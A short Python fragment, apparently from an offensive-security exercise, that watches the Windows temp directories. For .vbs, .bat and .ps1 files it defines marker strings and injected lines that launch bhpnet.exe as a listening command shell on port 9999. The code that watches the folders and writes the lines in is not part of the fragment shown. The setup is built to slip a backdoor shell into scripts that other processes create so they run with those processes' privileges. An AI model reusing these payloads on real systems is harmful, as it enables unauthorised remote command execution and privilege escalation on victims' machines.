import tempfile
import threading
import win32file
import win32con
import os

dirs_to_monitor = ["C:\\WINDOWS\\Temp", tempfile.gettempdir()]

FILE_CREATED = 1
FILE_DELETED = 2
FILE_MODIFIED = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO = 5

file_types = {
    '.vbs': ["\r\n'bhpmarker\r\n", f"\r\nCreateObject(\"Wscript.Shell\").Run(\"C:\\WINDOWS\\TEMP\\bhpnet.exe –l –p 9999 –c\")\r\n"],
    '.bat': ["\r\nREM bhpmarker\r\n", "\r\nC:\\WINDOWS\\TEMP\\bhpnet.exe –l –p 9999 –c\r\n"],
    '.ps1': ["\r\n#bhpmarker", "Start-Process \"C:\\WINDOWS\\TEMP\\bhpnet.exe –l –p 9999 –c\""],
}
